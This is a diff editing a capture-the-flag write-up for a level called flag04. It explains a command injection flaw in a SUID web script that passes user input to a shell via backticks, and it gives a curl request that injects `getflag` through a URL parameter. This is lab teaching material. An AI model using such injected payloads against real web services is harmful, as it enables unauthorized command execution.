@@ -19,15 +19,15 @@ x(param("x"));
 ```
 
 ### Vulnerability
-- The script executes user-controlled input directly in a shell via backticks:
+- User-controlled input is executed directly in a shell via backticks
 ```bash
 print `echo $y 2>&1`;
 ```
-- This creates a classic command injection vulnerability.
-- Because the binary is SUID (owned by `flag04`), any command executed via the script runs with flag04 privileges.
+- This creates a command injection vulnerability.
+- Because the script is SUID (owned by `flag04`), any command executed runs with `flag04` privileges.
 
 ## Exploitation
-- Access the local web service:
+- Access the local web service and inject the `getflag` command:
 ```bash
 curl 'http://localhost:4747/?x=`getflag`'
 ```
